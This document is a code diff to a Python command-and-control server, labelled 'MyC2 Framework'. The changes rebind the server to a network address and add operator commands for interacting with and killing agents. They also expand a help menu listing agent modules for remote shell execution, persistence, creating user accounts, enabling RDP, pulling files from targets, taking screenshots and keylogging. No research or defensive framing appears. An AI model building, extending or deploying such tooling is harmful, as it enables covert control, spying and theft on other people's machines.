@@ -9,7 +9,7 @@ from datetime import datetime
 import logging
 
 class C2Server:
-    def __init__(self, host='127.0.0.1', port=4444):
+    def __init__(self, host='192.168.100.2', port=4445):
         self.host = host
         self.port = port
         self.agents = {}
@@ -296,23 +296,33 @@ class C2Server:
             return None
     
     def command_handler(self):
-        """Handle operator commands"""
+        """Enhanced command handler with more options"""
         while self.running:
             try:
-                command = input("\nC2> ").strip()
+                command = input("\nC2> ").strip().lower()
                 
                 if command == 'exit':
                     self.shutdown()
                     break
                 elif command == 'agents':
                     self.list_agents()
+                elif command == 'modules':
+                    self.list_modules()
+                elif command == 'active':
+                    self.list_active_agents()
+                elif command.startswith('interact '):
+                    agent_id = command.split(' ')[1]
+                    self.interactive_mode(agent_id)
                 elif command.startswith('jobs '):
                     parts = command.split(' ')
                     if len(parts) >= 3:
                         agent_id = parts[1]
                         module_name = parts[2]
-                        args = parts[3:] if len(parts) > 3 else None
+                        args = ' '.join(parts[3:]) if len(parts) > 3 else ''
                         self.create_job(agent_id, module_name, args)
+                elif command.startswith('kill '):
+                    agent_id = command.split(' ')[1]
+                    self.kill_agent(agent_id)
                 elif command == 'help':
                     self.show_help()
                 else:
@@ -320,7 +330,7 @@ class C2Server:
                     
             except Exception as e:
                 self.logger.error(f"Error in command handler: {e}")
-    
+
     def list_agents(self):
         """List all registered agents"""
         try:
@@ -338,33 +348,31 @@ class C2Server:
                 
         except Exception as e:
             self.logger.error(f"Error listing agents: {e}")
-
-    def list_modules(self):
-        """Show available modules"""
-        modules = {
-            'sysinfo': 'Get detailed system information',
-            'persistence': 'Establish persistence (registry, scheduled_task, service, startup)',
-            'useradd': 'Create user accounts and manage RDP',
-            'screenshot': 'Capture screenshot',
-            'process_list': 'List running processes',
-            'shell': 'Execute shell commands',
-            'download': 'Download files from target',
-            'upload': 'Upload files to target'
-        }
-        
-        print("\nAvailable Modules:")
-        print("-" * 60)
-        for name, description in modules.items():
-            print(f"  {name:<15} - {description}")
     
     def show_help(self):
-        """Show available commands"""
-        print("\nAvailable Commands:")
+        """Show enhanced help menu"""
+        print("\n" + "="*50)
+        print("MyC2 Framework - Enhanced Commands")
+        print("="*50)
         print("  agents                    - List all registered agents")
+        print("  active                    - List only active agents") 
+        print("  modules                   - Show available modules")
+        print("  interact <agent_id>       - Enter interactive mode")
         print("  jobs <agent_id> <module>  - Create job for agent")
+        print("  kill <agent_id>           - Disconnect agent")
         print("  exit                      - Shutdown server")
-        print("  help                      - Show this help")
-    
+        print("\nAvailable Modules:")
+        print("  shell <command>           - Execute shell command")
+        print("  sysinfo                   - Get system information")
+        print("  persistence <method>      - Establish persistence")
+        print("  useradd <username> <pass> - Create new user")
+        print("  rdp <enable/disable>      - Manage RDP access")
+        print("  download <file>           - Download file from target")
+        print("  upload <local> <remote>   - Upload file to target")
+        print("  screenshot                - Capture screenshot")
+        print("  keylogger <start/stop>    - Keylogging functions")
+        print("  process_list              - List running processes")
+        print("="*50)
     def shutdown(self):
         """Shutdown the server gracefully"""
         self.logger.info("Shutting down C2 server...")
